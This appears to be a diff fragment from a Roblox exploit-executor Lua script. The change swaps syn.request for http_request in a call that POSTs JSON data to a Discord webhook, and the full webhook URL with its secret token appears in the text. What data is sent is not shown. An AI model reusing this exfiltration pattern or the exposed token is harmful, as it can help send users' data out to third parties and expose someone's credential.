@@ -18,7 +18,7 @@ local jsonData = HttpService:JSONEncode({
 })
 
 -- Используй syn.request (в зависимости от Exploit API)
-syn.request({
+http_request({
     Url = "https://discord.com/api/webhooks/1382969881992888471/iyZb4rFWDtfd0t3yoUWs_V9LAEIth0vpY8wIqL9VKinp5ycG7JcmoG2APfc5dSiTw8Li",
     Method = "POST",
     Headers = {
